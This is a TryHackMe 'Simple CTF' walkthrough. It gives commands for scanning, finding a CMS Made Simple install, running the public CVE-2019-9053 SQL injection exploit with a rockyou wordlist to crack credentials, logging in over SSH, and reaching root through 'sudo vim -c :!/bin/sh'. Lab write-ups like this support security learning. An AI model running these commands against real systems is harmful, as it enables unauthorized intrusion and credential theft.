# TryHackMe — Simple CTF: Walkthrough Notes

**Author:** nullRdx
**Room:** TryHackMe — Simple CTF (Easy)
**Category:** Web enumeration → CVE exploitation (SQLi) → SSH access → Linux privesc

---

## 1. Recon & Enumeration

### Nmap scan
Ran an aggressive scan to get service/version info in one pass:

```bash
nmap -A <target_ip>
```

**Findings:**
- Port 21 — FTP
- Port 80 — HTTP
- Port 2222 — SSH (non-default port, worth noting for later)

### Web enumeration
Opened the site on port 80 — nothing obvious on the landing page, so ran a directory brute-force:

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**
- `/simple` — a hidden directory serving a **CMS Made Simple** installation.

---

## 2. Vulnerability Research

Version-fingerprinted the CMS from the site footer, then checked Searchsploit for known exploits:

```bash
searchsploit cms made simple
```

**Result:** `CVE-2019-9053` — an **unauthenticated SQL injection** vulnerability in CMS Made Simple ≤ 2.2.9, with a public exploit script available (Python).

Copied the exploit locally with the `-m` flag:

```bash
searchsploit -m php/webapps/46635.py
```

---

## 3. Exploitation

Ran the exploit script with **Python 2** (the script's original target interpreter) against the `/simple` path, using `rockyou.txt` as the password-cracking wordlist:

```bash
python2 46635.py -u http://<target_ip>/simple -c -w /usr/share/wordlists/rockyou.txt
```

**Result:** Script pulled a valid username + cracked password from the CMS database.

### Gaining shell access
Used the recovered credentials to log in over SSH on the non-default port found during recon:

```bash
ssh <username>@<target_ip> -p 2222
```

Landed a shell as the low-privileged user. Located and read the user flag:

```bash
cat flag.txt
```

---

## 4. Privilege Escalation

Checked sudo permissions for the current user:

```bash
sudo -l
```

Found the user could run `vim` as root without a password — a classic GTFOBins privesc path, since `vim` can drop into a shell via its `-c` command flag:

```bash
sudo vim -c ':!/bin/sh'
```

This spawns a root shell directly from vim's escape hatch.

**Result:** Root access obtained. Retrieved the final flag from the root directory.

---

## 5. Summary — Kill Chain

| Stage | Technique |
|---|---|
| Recon | `nmap -A` — found FTP, HTTP, SSH (2222) |
| Enumeration | `gobuster` → found `/simple` → identified CMS Made Simple |
| Vuln research | Searchsploit → CVE-2019-9053 (SQLi) |
| Exploitation | Python2 exploit script + rockyou.txt → creds |
| Access | SSH login on port 2222 |
| Privesc | `sudo vim -c ':!/bin/sh'` → root shell |

## 6. Lessons / Notes to self
- Non-default SSH ports are still worth full credential attacks once creds are found elsewhere — don't assume "SSH is safe because it's not on 22."
- CMS fingerprinting from footer/version strings → Searchsploit is a fast, repeatable pipeline worth scripting later (ties into the Attack-to-Artifact Correlation Engine idea).
- `sudo -l` should be one of the first commands run after landing *any* shell — it's the fastest privesc triage step.
- Worth checking GTFOBins for any binary that shows up in `sudo -l` output before trying manual exploitation.
